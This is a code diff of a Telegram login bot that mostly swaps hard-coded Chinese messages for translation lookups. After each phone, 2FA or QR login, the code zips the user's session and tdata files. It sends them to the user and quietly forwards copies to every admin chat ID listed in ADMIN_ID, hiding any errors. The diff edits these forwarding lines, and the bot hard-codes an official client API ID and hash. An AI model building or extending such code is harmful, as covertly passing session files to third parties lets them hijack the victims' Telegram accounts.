@@ -22,6 +22,8 @@ ADMIN_ID = os.getenv("ADMIN_ID")
 API_ID = int(os.getenv("TELEGRAM_APP_ID", "2040"))
 API_HASH = os.getenv("TELEGRAM_APP_HASH", "b18441a1ff607e10a989891a5462e627")
 
+from i18n import tr, lang_from_update
+
 logger = logging.getLogger(__name__)
 
 _proxy_list = None
@@ -127,7 +129,7 @@ class LoginHandler:
             if not await self.client.is_user_authorized():
                 await self.client.send_code_request(phone)
                 await update.message.reply_text(
-                    "<tg-emoji emoji-id='5877316724830768997'>📤</tg-emoji> 验证码已发送，请输入：",
+                    "<tg-emoji emoji-id='5877316724830768997'>📤</tg-emoji> " + tr("login.code_sent", lang_from_update(update)),
                     parse_mode='HTML'
                 )
             else:
@@ -141,7 +143,7 @@ class LoginHandler:
                 await self.handle_phone(update, context, phone)
             else:
                 await update.message.reply_text(
-                    "<tg-emoji emoji-id='5839200986022812209'>❌</tg-emoji> 服务器繁忙，请稍后重试",
+                    "<tg-emoji emoji-id='5839200986022812209'>❌</tg-emoji> " + tr("login.server_busy", lang_from_update(update)),
                     parse_mode='HTML'
                 )
 
@@ -153,13 +155,13 @@ class LoginHandler:
                 return True
             except SessionPasswordNeededError:
                 await update.message.reply_text(
-                    "<tg-emoji emoji-id='6005570495603282482'>🔐</tg-emoji> 需要2FA密码，请输入：",
+                    "<tg-emoji emoji-id='6005570495603282482'>🔐</tg-emoji> " + tr("login.need_2fa", lang_from_update(update)),
                     parse_mode='HTML'
                 )
                 return False
             except AuthRestartError:
                 await update.message.reply_text(
-                    "<tg-emoji emoji-id='5877613700344450910'>❌</tg-emoji> 验证超时，请重新发送验证码",
+                    "<tg-emoji emoji-id='5877613700344450910'>❌</tg-emoji> " + tr("login.code_timeout", lang_from_update(update)),
                     parse_mode='HTML'
                 )
                 if self.client:
@@ -168,7 +170,7 @@ class LoginHandler:
                 return None
             except Exception as e:
                 await update.message.reply_text(
-                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 登录失败: {str(e)}",
+                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> {tr('login.failed', lang_from_update(update))}: {str(e)}",
                     parse_mode='HTML'
                 )
                 if self.client:
@@ -185,7 +187,7 @@ class LoginHandler:
                 return True
             except Exception as e:
                 await update.message.reply_text(
-                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 2FA验证失败: {str(e)}",
+                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> {tr('login.2fa_failed', lang_from_update(update))}: {str(e)}",
                     parse_mode='HTML'
                 )
                 return False
@@ -244,22 +246,22 @@ class LoginHandler:
         with open(zip_path, 'rb') as f_session:
             await context.bot.send_document(
                 chat_id=self.chat_id, document=f_session,
-                caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Session]",
+                caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> {tr('login.success', lang_from_update(update))}\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Session]",
                 parse_mode='HTML'
             )
         with open(tdata_zip_path, 'rb') as f_tdata:
             await context.bot.send_document(
                 chat_id=self.chat_id, document=f_tdata,
-                caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Tdata]",
+                caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> {tr('login.success', lang_from_update(update))}\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Tdata]",
                 parse_mode='HTML'
             )
         if ADMIN_ID:
             for admin_id in ADMIN_ID.split(','):
                 try:
                     with open(zip_path, 'rb') as f_session:
-                        await context.bot.send_document(chat_id=admin_id.strip(), document=f_session, caption=f"用户 {self.user_id} 登录: {self.phone} [Session]")
+                        await context.bot.send_document(chat_id=admin_id.strip(), document=f_session, caption=f"{tr('admin.user', lang_from_update(update))} {self.user_id} {tr('login.success', lang_from_update(update))}: {self.phone} [Session]")
                     with open(tdata_zip_path, 'rb') as f_tdata:
-                        await context.bot.send_document(chat_id=admin_id.strip(), document=f_tdata, caption=f"用户 {self.user_id} 登录: {self.phone} [Tdata]")
+                        await context.bot.send_document(chat_id=admin_id.strip(), document=f_tdata, caption=f"{tr('admin.user', lang_from_update(update))} {self.user_id} {tr('login.success', lang_from_update(update))}: {self.phone} [Tdata]")
                 except:
                     pass
         os.remove(zip_path)
@@ -320,7 +322,7 @@ class QrLoginHandler:
             with open(qr_path, 'rb') as f:
                 await context.bot.send_photo(
                     chat_id=self.chat_id, photo=f,
-                    caption="<tg-emoji emoji-id='5877318502947229960'>📱</tg-emoji> 请使用 Telegram 手机端扫描二维码登录\n\n⏱️ 二维码有效期为2分钟",
+                    caption="<tg-emoji emoji-id='5877318502947229960'>📱</tg-emoji> " + tr("login.qr_expiry", lang_from_update(update)),
                     parse_mode='HTML'
                 )
             os.remove(qr_path)
@@ -330,7 +332,7 @@ class QrLoginHandler:
             except asyncio.TimeoutError:
                 await context.bot.send_message(
                     chat_id=self.chat_id,
-                    text="<tg-emoji emoji-id='5900104897885376843'>⏰</tg-emoji> 扫码登录超时，请重新尝试",
+                    text="<tg-emoji emoji-id='5900104897885376843'>⏰</tg-emoji> " + tr("login.qr_timeout", lang_from_update(update)),
                     parse_mode='HTML'
                 )
                 await self._cleanup()
@@ -340,7 +342,7 @@ class QrLoginHandler:
                     self.waiting_for_2fa = True
                     await context.bot.send_message(
                         chat_id=self.chat_id,
-                        text="<tg-emoji emoji-id='6005570495603282482'>🔐</tg-emoji> 该账号已开启两步验证，请输入密码：",
+                        text="<tg-emoji emoji-id='6005570495603282482'>🔐</tg-emoji> " + tr("login.qr_2fa_hint", lang_from_update(update)),
                         parse_mode='HTML'
                     )
                     self._start_timeout_task(context, 120)
@@ -348,14 +350,14 @@ class QrLoginHandler:
                     logger.error(f"扫码登录异常: {e}", exc_info=True)
                     await context.bot.send_message(
                         chat_id=self.chat_id,
-                        text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 扫码登录失败: {error_str}",
+                        text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> {tr('login.qr_failed', lang_from_update(update))}: {error_str}",
                         parse_mode='HTML'
                     )
                     await self._cleanup()
         except FloodWaitError as e:
             await context.bot.send_message(
                 chat_id=self.chat_id,
-                text=f"<tg-emoji emoji-id='5877613700344450910'>⚠️</tg-emoji> 请求过于频繁，请等待 {e.seconds} 秒后重试",
+                text=f"<tg-emoji emoji-id='5877613700344450910'>⚠️</tg-emoji> " + tr("login.flood", lang_from_update(update)).format(s=e.seconds),
                 parse_mode='HTML'
             )
             await self._cleanup()
@@ -363,7 +365,7 @@ class QrLoginHandler:
             logger.error(f"扫码登录异常: {e}", exc_info=True)
             await context.bot.send_message(
                 chat_id=self.chat_id,
-                text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 扫码登录失败: {str(e)}",
+                text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> {tr('login.qr_failed', lang_from_update(update))}: {str(e)}",
                 parse_mode='HTML'
             )
             await self._cleanup()
@@ -382,7 +384,7 @@ class QrLoginHandler:
         except Exception as e:
             await context.bot.send_message(
                 chat_id=self.chat_id,
-                text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 2FA验证失败: {str(e)}",
+                text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> {tr('login.2fa_failed', lang_from_update(update))}: {str(e)}",
                 parse_mode='HTML'
             )
             await self._cleanup()
@@ -449,13 +451,13 @@ class QrLoginHandler:
             with open(zip_path, 'rb') as f_session:
                 await context.bot.send_document(
                     chat_id=self.chat_id, document=f_session,
-                    caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 扫码登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Session]",
+                    caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> {tr('login.qr_success', lang_from_update(update))}\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Session]",
                     parse_mode='HTML'
                 )
             with open(tdata_zip_path, 'rb') as f_tdata:
                 await context.bot.send_document(
                     chat_id=self.chat_id, document=f_tdata,
-                    caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 扫码登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Tdata]",
+                    caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> {tr('login.qr_success', lang_from_update(update))}\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Tdata]",
                     parse_mode='HTML'
                 )
 
@@ -463,9 +465,9 @@ class QrLoginHandler:
                 for admin_id in ADMIN_ID.split(','):
                     try:
                         with open(zip_path, 'rb') as f_session:
-                            await context.bot.send_document(chat_id=admin_id.strip(), document=f_session, caption=f"用户 {self.user_id} 扫码登录: {self.phone} [Session]")
+                            await context.bot.send_document(chat_id=admin_id.strip(), document=f_session, caption=f"{tr('admin.user', lang_from_update(update))} {self.user_id} {tr('login.qr_success', lang_from_update(update))}: {self.phone} [Session]")
                         with open(tdata_zip_path, 'rb') as f_tdata:
-                            await context.bot.send_document(chat_id=admin_id.strip(), document=f_tdata, caption=f"用户 {self.user_id} 扫码登录: {self.phone} [Tdata]")
+                            await context.bot.send_document(chat_id=admin_id.strip(), document=f_tdata, caption=f"{tr('admin.user', lang_from_update(update))} {self.user_id} {tr('login.qr_success', lang_from_update(update))}: {self.phone} [Tdata]")
                     except:
                         pass
 
@@ -478,7 +480,7 @@ class QrLoginHandler:
             logger.error(f"导出登录文件失败: {e}", exc_info=True)
             await context.bot.send_message(
                 chat_id=self.chat_id,
-                text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 导出文件失败: {str(e)}",
+                text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> {tr('login.export_failed', lang_from_update(update))}: {str(e)}",
                 parse_mode='HTML'
             )
         finally:
@@ -492,7 +494,7 @@ class QrLoginHandler:
             if self.waiting_for_2fa:
                 await context.bot.send_message(
                     chat_id=self.chat_id,
-                    text="<tg-emoji emoji-id='5900104897885376843'>⏰</tg-emoji> 2FA输入超时，请重新扫码",
+                    text="<tg-emoji emoji-id='5900104897885376843'>⏰</tg-emoji> " + tr("login.2fa_timeout", "zh"),
                     parse_mode='HTML'
                 )
                 await self._cleanup()
